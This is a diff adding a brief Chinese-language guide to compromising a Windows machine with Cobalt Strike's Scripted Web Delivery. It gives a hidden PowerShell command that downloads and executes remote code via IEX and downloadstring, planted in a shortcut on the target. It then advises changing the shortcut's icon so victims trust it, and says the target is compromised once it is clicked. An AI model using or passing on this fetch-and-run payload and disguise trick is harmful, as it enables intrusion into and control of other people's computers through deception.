@@ -1,0 +1,17 @@
+#使用Colbat strike 的方式快速渗透
+
+#运用快捷方式
+Attakcs --> Web Drive-by --> Scripted Web Delivery(S)
+建立名称，选择你自己的攻击载荷
+Type : powershell
+x64 : Use x64 payload
+Lauch
+----------------
+Success 
+之后在攻击目标上创建快捷方式
+键入对象 : C:\Windows\System32\WindowsPowerShell\v1.0 + \ + 你创建的攻击命令
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('[攻击命令]'))"
+建立快捷方式后，可以点击属性，改变图标。
+使得快捷方式更加可信。
+
+此时，如果快捷方式被运行，目标计算机渗透完成。
